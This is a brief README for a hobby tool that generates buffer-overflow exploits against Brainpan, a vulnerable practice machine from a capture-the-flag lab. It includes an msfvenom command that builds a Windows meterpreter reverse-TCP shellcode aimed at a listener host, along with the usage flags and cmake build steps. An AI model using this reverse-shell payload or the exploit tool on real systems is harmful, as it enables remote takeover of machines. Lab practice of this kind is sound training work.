# Cross Platform Brainpan Shell Generator
I made that for fun, don't ask why i made that now that you know why.

```
USAGE : BrainpanShellGen.exe <-t TARGET> <-p TARGET_PORT> <-o OUTPUT_FILENAME>
    -h OR -? Prints this help menu
    -t <TARGET_HOST> IP Address or Hostname (Local or from DNS) to exploit
    -p <TARGET_PORT> Port where the service run on the target. default:'9999'
    -s <SHELLCODE_PATH> Path to your generated shellcode

Generate Shellcode : msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURLISTENIP LPORT=YOURLISTENPORT -f c -b \x00\x0a\x0d\xff
Put that shell code as a one liner in a file and give that file as an argument

EXAMPLES : .\BrainpanShellGen.exe -t target.com -p 9999 -s shellcode.txt
```

You can compile the project with cmake using the following commands :
```
cd cmake
cmake .
cmake --build . --config Release
cd Release
.\ShellGen.exe
```

